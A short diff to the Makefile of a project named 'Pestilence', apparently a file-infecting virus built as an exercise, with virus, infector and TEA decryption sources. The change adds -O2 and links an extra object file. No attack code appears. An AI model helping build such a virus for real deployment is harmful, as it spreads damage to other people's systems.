@@ -2,7 +2,7 @@ NAME = Pestilence
 
 DEBUG=1
 
-FLAGS = -MD -fno-stack-protector -fPIC -fPIE -Wextra -Wall -D DEBUG=$(DEBUG)
+FLAGS = -MD -fno-stack-protector -fPIC -fPIE -Wextra -Wall -O2 -D DEBUG=$(DEBUG)
 
 SRC_DIR				= .
 TMP_DIR				= .tmp
@@ -31,10 +31,12 @@ SRC_S = virus/start.s lib/crypto/tea_decrypt.s
 
 OBJ	=	$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.o)) \
 		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o)) \
+		.tmp/obj/lib/ft_lib/call.o
 
 SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO)
 
-OBJ_INF	= $(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o))
+OBJ_INF	= $(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o)) \
+		.tmp/obj/lib/ft_lib/call.o
 
 DEP =		$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.d)) \
 		$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.d))
